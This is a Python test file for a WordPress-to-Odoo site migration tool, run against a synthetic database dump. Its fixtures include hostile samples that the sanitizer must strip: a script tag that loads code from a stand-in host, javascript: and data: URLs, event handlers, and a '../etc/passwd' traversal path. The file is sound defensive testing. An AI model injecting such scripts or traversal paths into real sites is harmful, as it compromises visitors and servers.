#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-or-later
"""Tests for wordpress_to_odoo.py against a small synthetic WordPress multisite dump (no real site, no network)."""

# [@ANCHOR: test_wordpress_to_odoo:read_dump]
# Tests [@ANCHOR: wordpress_to_odoo:read_dump]
# [@ANCHOR: test_wordpress_to_odoo:wpautop]
# Tests [@ANCHOR: wordpress_to_odoo:wpautop]
# [@ANCHOR: test_wordpress_to_odoo:cleaner]
# Tests [@ANCHOR: wordpress_to_odoo:cleaner]
# [@ANCHOR: test_wordpress_to_odoo:converter]
# Tests [@ANCHOR: wordpress_to_odoo:converter]
# [@ANCHOR: test_wordpress_to_odoo:check_arch_safe]
# Tests [@ANCHOR: wordpress_to_odoo:check_arch_safe]
# [@ANCHOR: test_wordpress_to_odoo:scan_tree]
# Tests [@ANCHOR: wordpress_to_odoo:scan_tree]

import collections
import gzip
import json
import os
import shutil
import tempfile
import unittest

import odoo_site_migrate as mig
import wordpress_to_odoo as wp

POST_COLUMNS = ["ID", "post_author", "post_date", "post_date_gmt", "post_content", "post_title", "post_excerpt",
                "post_status", "comment_status", "ping_status", "post_password", "post_name", "to_ping", "pinged",
                "post_modified", "post_modified_gmt", "post_content_filtered", "post_parent", "guid", "menu_order",
                "post_type", "post_mime_type", "comment_count"]
TABLES = {
    "wp_blogs": ["blog_id", "site_id", "domain", "path"],
    "wp_users": ["ID", "user_login", "display_name"],
    "wp_8_options": ["option_id", "option_name", "option_value", "autoload"],
    "wp_8_posts": POST_COLUMNS,
    "wp_8_postmeta": ["meta_id", "post_id", "meta_key", "meta_value"],
    "wp_8_terms": ["term_id", "name", "slug", "term_group"],
    "wp_8_term_taxonomy": ["term_taxonomy_id", "term_id", "taxonomy", "description", "parent", "count"],
    "wp_8_term_relationships": ["object_id", "term_taxonomy_id", "term_order"],
    "wp_8_comments": ["comment_ID", "comment_post_ID", "comment_author", "comment_author_email", "comment_author_url",
                      "comment_author_IP", "comment_date", "comment_date_gmt", "comment_content", "comment_karma",
                      "comment_approved", "comment_agent", "comment_type", "comment_parent", "user_id"],
}
INJECTED = ("<script>var url = 'https://bad.example/x'; var s = document.createElement('script'); s.src = url;"
            "document.head.appendChild(s);</script>")


def sql_value(value):
    if value is None:
        return "NULL"
    if isinstance(value, (int, float)):
        return str(value)
    escaped = (value.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n").replace("\r", "\\r")
               .replace("\0", "\\0"))
    return f"'{escaped}'"


def render_dump(rows_by_table):
    """A MariaDB 11 style dump: `INSERT INTO t VALUES` then one tuple per line."""
    out = ["-- synthetic dump"]
    for table, columns in TABLES.items():
        out.append(f"CREATE TABLE `{table}` (")
        out.extend(f"  `{c}` text," for c in columns)
        out.append("  PRIMARY KEY (`x`)")
        out.append(") ENGINE=InnoDB;")
        rows = rows_by_table.get(table, [])
        if rows:
            out.append(f"INSERT INTO `{table}` VALUES")
            tuples = ["(" + ",".join(sql_value(r.get(c)) for c in columns) + ")" for r in rows]
            out.append(",\n".join(tuples) + ";")
    return "\n".join(out) + "\n"


def post(ident, title, content, name=None, kind="post", status="publish", parent=0, date="2018-03-03 10:00:00", **extra):
    row = dict.fromkeys(POST_COLUMNS, "")
    row.update({"ID": ident, "post_author": 1, "post_date": date, "post_date_gmt": date, "post_content": content,
                "post_title": title, "post_status": status, "comment_status": "closed", "post_password": "",
                "post_name": name if name is not None else title.lower().replace(" ", "-"), "post_parent": parent,
                "menu_order": 0, "post_type": kind, "comment_count": 0})
    row.update(extra)
    return row


def option(name, value):
    return {"option_name": name, "option_value": value, "autoload": "yes"}


def build_dump():
    posts = [
        post(2, "Sample Page", "<!-- wp:paragraph -->\n<p>This is an example page. It's different.</p>\n<!-- /wp:paragraph -->",
             name="sample-page", kind="page"),
        post(45, "About Me", "Line one.\n\nSecond <em>paragraph</em> & more.\nWith a break." + INJECTED, name="about-me",
             kind="page", date="2016-01-03 05:17:22"),
        post(1026, "Gadget", "Top.", name="gadget", kind="page"),
        post(1064, "Gadget Advanced", "[caption id=\"a\" align=\"alignleft\" width=\"100\"]"
             "<a href=\"https://perens.com/wp-content/uploads/sites/4/2019/01/pic.jpg\">"
             "<img src=\"https://perens.com/wp-content/uploads/sites/4/2019/01/pic-300x200.jpg\""
             " alt=\"\" /></a> The caption.[/caption]\nBody.", name="advanced", kind="page", parent=1026),
        post(964, "Moved", "never shown", name="moved", kind="page"),
        post(10, "First Post", "Hello <a href=\"https://perens.com/2018/03/04/second-post/\">second</a> and "
             "<a href=\"http://perens.com/about-me/\">about</a>, <a href=\"https://perens.com/static/doc.pdf\">pdf</a>, "
             "<a href=\"https://perens.com/static/missing.pdf\">gone</a>. <a href=\"javascript:alert(1)\">bad</a>"
             "<img src=\"https://mail.google.com/mail/u/0/images/cleardot.gif\" />\n\n<p onclick=\"x()\" style=\"color:red\">"
             "styled</p>" + INJECTED + "<script>alert(2)</script>", name="first-post", date="2018-03-03 10:00:00",
             comment_status="open"),
        post(11, "Second Post", "<!-- wp:paragraph -->\n<p>Block <b>text</b></p>\n<!-- /wp:paragraph -->",
             name="second-post", date="2018-03-04 11:00:00"),
        post(12, "Draft Post", "secret", name="draft-post", status="draft"),
        post(13, "Private Post", "secret", name="private-post", status="private"),
        post(14, "", "<!-- wp:paragraph --><!-- /wp:paragraph -->", name="14", date="2025-10-31 01:31:44"),
        post(15, "Redirected", "stub", name="redirected"),
        post(16, "Renamed Post", "Renamed body.", name="new-slug", date="2019-05-06 07:08:09"),
        post(17, "Links & <Tags>", "Text with a < b and an &amp; entity.", name="links-tags", date="2019-06-01 00:00:00"),
        post(99, "", "", name="99", kind="revision", status="inherit"),
        post(49, "", "", name="49", kind="nav_menu_item"),
        post(50, "", "", name="50", kind="nav_menu_item"),
        post(51, "Resume", "", name="resume", kind="nav_menu_item"),
        post(52, "", "", name="52", kind="nav_menu_item"),
    ]
    meta = [
        (49, "_menu_item_type", "post_type"), (49, "_menu_item_object", "page"), (49, "_menu_item_object_id", "45"),
        (50, "_menu_item_type", "post_type"), (50, "_menu_item_object", "page"), (50, "_menu_item_object_id", "1026"),
        (51, "_menu_item_type", "custom"), (51, "_menu_item_url", "https://perens.com/wp-content/uploads/sites/4/2020/cv.pdf"),
        (52, "_menu_item_type", "post_type"), (52, "_menu_item_object", "page"), (52, "_menu_item_object_id", "964"),
        (964, "_pprredirect_active", "1"), (964, "_pprredirect_url", "http://perens.com/static/ARRL/page.html"),
        (15, "_pprredirect_active", "1"), (15, "_pprredirect_url", "https://example.org/elsewhere"),
        (16, "_wp_old_slug", "old-slug"),
    ]
    rows = {
        "wp_blogs": [{"blog_id": 1, "site_id": 1, "domain": "wp.perens.com", "path": "/"},
                     {"blog_id": 8, "site_id": 1, "domain": "perens.com", "path": "/"}],
        "wp_users": [{"ID": 1, "user_login": "Bruce", "display_name": "Bruce"}],
        "wp_8_options": [
            option("siteurl", "http://perens.com"), option("home", "http://perens.com"), option("blogname", "Bruce Perens"),
            option("blogdescription", ""), option("permalink_structure", "/%year%/%monthnum%/%day%/%postname%/"),
            option("stylesheet", "twentyseventeen"), option("template", "twentyseventeen"),
            option("theme_mods_twentyseventeen", 'a:2:{i:0;b:0;s:18:"nav_menu_locations";a:1:{s:3:"top";i:2;}}'),
            option("cloudflare_api_key", "not-a-real-key-0123456789"), option("active_plugins", "a:0:{}"),
        ],
        "wp_8_posts": posts,
        "wp_8_postmeta": [{"meta_id": i, "post_id": p, "meta_key": k, "meta_value": v} for i, (p, k, v) in enumerate(meta, 1)],
        "wp_8_terms": [{"term_id": 1, "name": "Uncategorized", "slug": "uncategorized"},
                       {"term_id": 2, "name": "Pages", "slug": "pages"}],
        "wp_8_term_taxonomy": [{"term_taxonomy_id": 1, "term_id": 1, "taxonomy": "category", "count": 5},
                               {"term_taxonomy_id": 2, "term_id": 2, "taxonomy": "nav_menu", "count": 4}],
        "wp_8_term_relationships": [{"object_id": i, "term_taxonomy_id": 2} for i in (49, 50, 51, 52)]
        + [{"object_id": i, "term_taxonomy_id": 1} for i in (10, 11)],
        "wp_8_comments": [
            {"comment_ID": 1, "comment_post_ID": 10, "comment_author": "Spammer", "comment_author_email": "s@example.invalid",
             "comment_author_url": "http://spam.example", "comment_author_IP": "203.0.113.9",
             "comment_date": "2019-01-01 00:00:00",
             "comment_content": "buy now", "comment_approved": "0", "comment_type": "comment", "comment_parent": 0, "user_id": 0},
        ],
    }
    return render_dump(rows)


class Fixture(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp(prefix="wp2odoo-test-")
        cls.sql = os.path.join(cls.tmp, "dump.sql.gz")
        with gzip.open(cls.sql, "wt", encoding="utf-8") as handle:
            handle.write(build_dump())
        cls.site = wp.WordPressSite(wp.read_dump(cls.sql), 8)

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def converter(self, **kwargs):
        converter = wp.Converter(self.site, ("perens.com",), **kwargs)
        return converter, converter.convert_all()


class DumpReaderTests(unittest.TestCase):
    def test_values_escapes_nulls_hex_and_doubled_quotes(self):
        rows = list(wp.parse_values("(1,'it\\'s',NULL,-2.5,0x4142,'a''b','x\\ny'),(2,'\\\\',1e3,'','(,)');"))
        self.assertEqual(rows[0], (1, "it's", None, -2.5, b"AB", "a'b", "x\ny"))
        self.assertEqual(rows[1], (2, "\\", 1000.0, "", "(,)"))

    def test_a_malformed_tuple_raises_instead_of_guessing(self):
        with self.assertRaises(ValueError):
            list(wp.parse_values("(1,'unterminated);"))
        with self.assertRaises(ValueError):
            list(wp.parse_values("(1 2);"))

    def test_mariadb_multiline_and_single_line_forms_and_table_filter(self):
        text = ("CREATE TABLE `a` (\n  `id` int,\n  `v` text,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB;\n"
                "INSERT INTO `a` VALUES\n(1,'x'),\n(2,'y;');\n"
                "CREATE TABLE `b` (\n  `id` int,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB;\n"
                "INSERT INTO `b` VALUES (7),(8);\n")
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "d.sql")
            with open(path, "w", encoding="utf-8") as handle:
                handle.write(text)
            both = wp.read_dump(path)
            self.assertEqual(both["a"], {"columns": ["id", "v"], "rows": [(1, "x"), (2, "y;")]})
            self.assertEqual(both["b"]["rows"], [(7,), (8,)])
            self.assertEqual(list(wp.read_dump(path, {"b"})), ["b"])

    def test_php_unserialize_arrays_strings_and_garbage(self):
        value = wp.php_unserialize('a:2:{s:3:"top";i:2;s:1:"x";a:1:{i:0;b:1;}}')
        self.assertEqual(value, {"top": 2, "x": {0: True}})
        self.assertIsNone(wp.php_unserialize("O:8:\"stdClass\":0:{}"))
        self.assertIsNone(wp.php_unserialize("not serialized"))


class WpautopTests(unittest.TestCase):
    def test_blank_lines_become_paragraphs_and_single_newlines_breaks(self):
        self.assertEqual(wp.wpautop("One\n\nTwo\nthree"), "<p>One</p>\n<p>Two<br />\nthree</p>\n")

    def test_block_tags_are_not_wrapped_and_lists_stay_lists(self):
        out = wp.wpautop("Intro\n<ul>\n<li>a</li>\n<li>b</li>\n</ul>\nOutro")
        self.assertIn("<ul>\n<li>a</li>\n<li>b</li>\n</ul>", out)
        self.assertNotIn("<p><ul>", out)
        self.assertNotIn("<p><li>", out)

    def test_pre_is_left_alone_and_empty_input_is_empty(self):
        out = wp.wpautop("A\n\n<pre>x\n\ny</pre>\n\nB")
        self.assertIn("<pre>x\n\ny</pre>", out)
        self.assertEqual(wp.wpautop("  \n "), "")


class CleanerTests(unittest.TestCase):
    def clean(self, html, qweb=False):
        stats = collections.Counter()
        cleaner = wp.Cleaner(["perens.com"], stats)
        return wp.serialize_children(cleaner.clean_fragment(html), qweb), stats

    def test_scripts_handlers_styles_and_unsafe_urls_are_removed(self):
        out, stats = self.clean(
            '<p onclick="x()" style="color:red">hi <a href="javascript:alert(1)">a</a> '
            '<a href=" java\tscript:alert(2)">b</a> <a href="data:text/html;base64,AAAA">c</a></p>'
            '<script>alert(1)</script><iframe src="https://e.example"></iframe><form action="/x"><input></form>'
            '<img src="x" onerror="alert(1)"><svg onload="x()"><script>1</script></svg><style>p{}</style>')
        self.assertEqual(wp.check_html_safe(out), [])
        for forbidden in ("script", "onclick", "onerror", "style", "javascript", "iframe", "<form", "<svg"):
            self.assertNotIn(forbidden, out.lower())
        self.assertGreaterEqual(stats["unsafe_urls_removed"], 3)
        self.assertEqual(stats["event_handlers_removed"], 2)

    def test_allowed_markup_survives_and_wordpress_classes_do_not(self):
        out, _ = self.clean('<h2 class="wp-block-heading">T</h2><table><tr><th>a</th><td colspan="2">b</td></tr></table>'
                            '<ul><li><a href="https://example.org/x">x</a></li></ul>'
                            '<img class="size-large wp-image-5 alignleft" src="/a.png" width="10" height="x">')
        self.assertIn("<h2>T</h2>", out)
        self.assertIn('colspan="2"', out)
        self.assertIn('rel="noopener noreferrer"', out)
        self.assertNotIn("wp-image", out)
        self.assertNotIn("size-large", out)
        self.assertIn("float-start", out)
        self.assertNotIn('height="x"', out)
        self.assertIn('class="table table-bordered table-sm"', out)

    def test_text_with_angle_brackets_is_escaped_for_qweb_and_for_html(self):
        html_out, _ = self.clean("<p>a &lt;script&gt;alert(1)&lt;/script&gt; &amp; b</p>")
        self.assertIn("&lt;script&gt;", html_out)
        arch, _ = self.clean("<p>a &lt;script&gt; &amp; b</p>", qweb=True)
        # QWeb writes text raw, so the node itself holds the entity text: no raw `<` remains.
        self.assertEqual(wp.check_arch_safe(arch), [])
        self.assertIn("&amp;lt;script&amp;gt;", arch)

    def test_gmail_redirect_links_are_unwrapped_and_tracking_pixels_dropped(self):
        out, stats = self.clean('<a href="https://www.google.com/url?q=https://example.org/real&amp;sa=D">x</a>'
                                '<img src="https://mail.google.com/mail/u/0/images/cleardot.gif">')
        self.assertIn('href="https://example.org/real"', out)
        self.assertNotIn("cleardot", out)
        self.assertEqual(stats["tracking_images_removed"], 1)

    def test_a_link_whose_text_is_an_old_domain_url_shows_it_without_the_scheme(self):
        out, _ = self.clean('<a href="https://perens.com/static/RV.pdf">https://perens.com/static/RV.pdf</a>')
        self.assertIn(">perens.com/static/RV.pdf<", out)


class SafetyCheckTests(unittest.TestCase):
    def test_check_arch_safe_reports_what_the_page_sanitizer_would_strip(self):
        bad = ('<div onclick="x()"><script>1</script><a href="javascript:1" t-att-href="x">a</a>'
               '<span style="x">&lt;b&gt;</span></div>')
        problems = wp.check_arch_safe(bad)
        joined = " ".join(problems)
        for expected in ("event handler", "forbidden element <script>", "dangerous URL", "QWeb directive", "style attribute"):
            self.assertIn(expected, joined)
        self.assertEqual(wp.check_arch_safe("<p>fine &amp;amp; <em>ok</em></p>"), [])
        self.assertTrue(wp.check_arch_safe("<p>not closed"))
        self.assertIn("raw '<'", " ".join(wp.check_arch_safe("<p><![CDATA[a<b]]></p>")))


class ConverterTests(Fixture):
    def test_inventory_counts_types_and_never_returns_secret_values(self):
        info = wp.inventory(self.site)
        self.assertEqual(info["site"]["permalink_structure"], "/%year%/%monthnum%/%day%/%postname%/")
        self.assertEqual(info["post_types"]["revision/inherit"], 1)
        self.assertEqual(info["secret_looking_options_not_copied"], ["cloudflare_api_key"])
        self.assertNotIn("not-a-real-key", json.dumps(info))
        self.assertEqual(info["comments"]["total"], 1)
        self.assertEqual(info["redirect_plugin_posts"], [15, 964])
        self.assertEqual([m["id"] for m in info["nav_menu"]], [49, 50, 51, 52])
        self.assertEqual(info["other_sites_in_dump"], [{"blog_id": 1, "domain": "wp.perens.com"}])

    def test_pages_keep_their_urls_posts_get_blog_urls_and_the_rest_is_dropped_with_a_reason(self):
        converter, data = self.converter()
        self.assertEqual(sorted(p["url"] for p in data["website.page"]), ["/about-me", "/gadget", "/gadget/advanced"])
        names = sorted(p["name"] for p in data["blog.post"])
        self.assertEqual(names, ["First Post", "Links & <Tags>", "Renamed Post", "Second Post"])
        reasons = {d["id"]: d["reason"] for d in converter.dropped}
        self.assertIn("placeholder", reasons[2])
        self.assertIn("draft", reasons[12])
        self.assertIn("private", reasons[13])
        self.assertIn("no title", reasons[14])
        self.assertEqual(converter.stats["skipped_revision"], 1)
        status = {row["id"]: row["status"] for row in converter.sitemap if row["kind"] in ("page", "post")}
        self.assertEqual(status[12], "dropped")
        self.assertEqual(status[964], "redirect-301")

    def test_every_old_permalink_form_redirects_and_plugin_redirects_go_where_the_plugin_sent_them(self):
        _, data = self.converter()
        redirects = {r["url_from"]: r["url_to"] for r in data["website.rewrite"]}
        first = f"/blog/{mig.slugify(wp.DEFAULT_BLOG_NAME)}-{wp.BLOG_ID}/first-post-10"
        for old in ("/2018/03/03/first-post", "/blog/2018/03/03/first-post"):
            self.assertEqual(redirects[old], first)
        # Odoo itself 301s "/x/" to "/x" before any rule applies, so no slash forms are written
        self.assertFalse([u for u in redirects if u.endswith("/")])
        self.assertEqual(redirects["/feed"], f"/blog/{mig.slugify(wp.DEFAULT_BLOG_NAME)}-{wp.BLOG_ID}/feed")
        self.assertEqual(redirects["/moved"], "/static/ARRL/page.html")
        self.assertEqual(redirects["/2018/03/03/redirected"], "https://example.org/elsewhere")
        self.assertNotIn("/2025/10/31/14", redirects)
        self.assertEqual(len({r["url_from"] for r in data["website.rewrite"]}), len(data["website.rewrite"]))

    def test_internal_links_are_rewritten_and_old_slugs_resolve(self):
        converter, data = self.converter()
        first = next(p for p in data["blog.post"] if p["id"] == 10)["content"]
        self.assertIn(f'href="/blog/{mig.slugify(wp.DEFAULT_BLOG_NAME)}-{wp.BLOG_ID}/second-post-11"', first)
        self.assertIn('href="/about-me"', first)
        self.assertIn('href="/static/doc.pdf"', first)
        self.assertNotIn("perens.com", first)
        self.assertEqual(converter.lookup_internal("/2019/05/06/old-slug/"),
                         f"/blog/{mig.slugify(wp.DEFAULT_BLOG_NAME)}-{wp.BLOG_ID}/renamed-post-16")

    def test_content_has_no_script_and_passes_the_safety_check(self):
        converter, data = self.converter()
        self.assertEqual(converter.stats["injected_scripts_removed"], 3)
        for view in data["ir.ui.view"]:
            self.assertEqual(wp.check_arch_safe(view["arch_db"]), [], view["name"])
            self.assertNotIn("bad.example", view["arch_db"])
        for row in data["blog.post"]:
            self.assertEqual(wp.check_html_safe(row["content"]), [], row["name"])
            self.assertNotIn("bad.example", row["content"])
            self.assertNotIn("alert", row["content"])
        about = next(v for v in data["ir.ui.view"] if v["name"] == "About Me")["arch_db"]
        self.assertIn("<p>Line one.</p>", about)
        self.assertIn("<h1>About Me</h1>", about)
        self.assertIn("&amp;amp; more", about)  # the page text is written raw by QWeb: escaped twice in the arch

    def test_caption_shortcode_becomes_a_figure_and_missing_uploads_are_reported(self):
        converter, data = self.converter()
        advanced = next(v for v in data["ir.ui.view"] if v["name"] == "Gadget Advanced")["arch_db"]
        self.assertIn("<figure", advanced)
        self.assertIn("figcaption", advanced)
        self.assertNotIn("[caption", advanced)
        self.assertIn("/wp-content/uploads/sites/4/2019/01/pic.jpg", advanced)
        self.assertIn("/wp-content/uploads/sites/4/2019/01/pic-300x200.jpg", converter.media.missing)
        self.assertTrue(converter.stats["upload_refs_missing"])

    def test_uploads_that_exist_become_attachments_with_redirects_for_every_old_path(self):
        uploads = os.path.join(self.tmp, "uploads")
        os.makedirs(os.path.join(uploads, "sites/4/2019/01"), exist_ok=True)
        with open(os.path.join(uploads, "sites/4/2019/01/pic.jpg"), "wb") as handle:
            handle.write(b"\xff\xd8\xff fake jpeg")
        converter, data = self.converter(uploads_dirs=[uploads])
        self.assertEqual([a["name"] for a in data["ir.attachment"]], ["pic.jpg"])
        attachment = data["ir.attachment"][0]
        self.assertTrue(attachment["public"])
        self.assertNotIn("mimetype", attachment)
        advanced = next(v for v in data["ir.ui.view"] if v["name"] == "Gadget Advanced")["arch_db"]
        self.assertIn(f"/web/image/{attachment['id']}", advanced)
        self.assertNotIn("wp-content", advanced)
        redirects = {r["url_from"]: r["url_to"] for r in data["website.rewrite"]}
        self.assertEqual(redirects["/wp-content/uploads/sites/4/2019/01/pic.jpg"], f"/web/image/{attachment['id']}")
        self.assertEqual(redirects["/wp-content/uploads/sites/4/2019/01/pic-300x200.jpg"], f"/web/image/{attachment['id']}")

    def test_menu_follows_the_nav_menu_with_redirected_pages_and_custom_links(self):
        _, data = self.converter()
        root, *items = data["website.menu"]
        self.assertEqual(root["name"], wp.ROOT_MENU_NAME)
        self.assertEqual([(i["name"], i["url"]) for i in items], [
            ("About Me", "/about-me"), ("Gadget", "/gadget"), ("Resume", "/wp-content/uploads/sites/4/2020/cv.pdf"),
            ("Moved", "/static/ARRL/page.html")])
        self.assertEqual([i["sequence"] for i in items], sorted(i["sequence"] for i in items))

    def test_convert_writes_an_export_the_importer_accepts_and_the_comments_csv_has_no_addresses(self):
        out = os.path.join(self.tmp, "export")
        static = os.path.join(self.tmp, "www")
        os.makedirs(os.path.join(static, "static"))
        with open(os.path.join(static, "static", "doc.pdf"), "wb") as handle:
            handle.write(b"%PDF")
        report, manifest = wp.convert(self.sql, out, 8, static_root=static, log=lambda *_: None)
        self.assertEqual(mig.verify_export(out), [])
        self.assertEqual(manifest["models"]["blog.post"]["count"], 4)
        self.assertEqual(report["static_references_missing"], ["/static/missing.pdf"])
        csv_text = open(os.path.join(out, "reports", "comments_dropped.csv"), encoding="utf-8").read()
        self.assertIn("buy now", csv_text)
        for private in ("s@example.invalid", "203.0.113.9", "spam.example"):
            self.assertNotIn(private, csv_text)
        sitemap = open(os.path.join(out, "reports", "sitemap.csv"), encoding="utf-8").read()
        self.assertIn("/2018/03/03/first-post/", sitemap)
        self.assertEqual(oct(os.stat(out).st_mode & 0o777), "0o700")
        with self.assertRaises(mig.MigrateError):
            wp.convert(self.sql, out, 8, log=lambda *_: None)

    def test_finalize_sitemap_puts_the_real_ids_in_from_the_importers_idmap(self):
        out = os.path.join(self.tmp, "export_final")
        wp.convert(self.sql, out, 8, log=lambda *_: None)
        with open(os.path.join(out, "idmap.json"), "w", encoding="utf-8") as handle:
            json.dump({"blog.blog": {str(wp.BLOG_ID): 4}, "blog.post": {"10": 501, "11": 502}}, handle)
        self.assertGreater(wp.finalize_sitemap(out), 5)
        with open(os.path.join(out, "reports", "sitemap_final.csv"), encoding="utf-8", newline="") as handle:
            rows = {r["old_url"]: r for r in __import__("csv").DictReader(handle)}
        self.assertEqual(rows["/2018/03/03/first-post/"]["new_url"], "/blog/bruce-perens-blog-4/first-post-501")
        self.assertEqual(rows["/about-me/"]["new_url"], "/about-me")
        self.assertEqual(rows["/2018/03/04/draft-post/"]["new_url"] if "/2018/03/04/draft-post/" in rows else "", "")

    def test_a_dump_without_the_blog_is_refused(self):
        with self.assertRaises(ValueError):
            wp.WordPressSite(wp.read_dump(self.sql), 77)

    def test_unpublished_posts_are_imported_only_on_request_and_as_unpublished(self):
        _, data = self.converter(include_unpublished=True)
        drafts = [p for p in data["blog.post"] if p["name"] in ("Draft Post", "Private Post")]
        self.assertEqual(len(drafts), 2)
        self.assertTrue(all(not p["is_published"] for p in drafts))


class ScanTests(unittest.TestCase):
    def test_secret_looking_names_and_contents_are_found_without_printing_values(self):
        with tempfile.TemporaryDirectory() as tmp:
            for rel, data in {
                "static/ok.html": "<p>fine</p>", "static/.env": "X=1", "static/wp-config.php": "<?php",
                "static/dump.sql": "INSERT", "static/key.pem": "x", "static/p4g/.git/config": "[core]",
                "static/notes.txt": "password = 'hunter2hunter2'", "static/a.txt": "-----BEGIN RSA PRIVATE KEY-----\nx",
                "static/backup-site.zip": "zip", "static/video.webm": "v", "debug.log": "log",
            }.items():
                path = os.path.join(tmp, rel)
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, "w", encoding="utf-8") as handle:
                    handle.write(data)
            found = wp.scan_tree([tmp])
            by_path = {os.path.relpath(f["path"], tmp): f for f in found}
            for expected in ("static/.env", "static/wp-config.php", "static/dump.sql", "static/key.pem", "static/p4g/.git",
                             "static/notes.txt", "static/a.txt", "static/backup-site.zip", "debug.log"):
                self.assertIn(expected, by_path)
            self.assertNotIn("static/ok.html", by_path)
            self.assertNotIn("static/video.webm", by_path)
            self.assertNotIn("hunter2", json.dumps(found))
            self.assertEqual(wp.main(["scan", "--root", tmp], out=lambda *_: None), 1)

    def test_static_references_that_resolve_to_a_directory_need_an_index(self):
        with tempfile.TemporaryDirectory() as tmp:
            os.makedirs(os.path.join(tmp, "static", "a"))
            os.makedirs(os.path.join(tmp, "static", "b"))
            with open(os.path.join(tmp, "static", "a", "index.html"), "w", encoding="utf-8") as handle:
                handle.write("x")
            missing = wp.static_refs_missing(tmp, {"/static/a/", "/static/b/", "/static/../etc/passwd", "/static/none.pdf"})
            self.assertEqual(missing, ["/static/../etc/passwd", "/static/b/", "/static/none.pdf"])


if __name__ == "__main__":
    unittest.main()
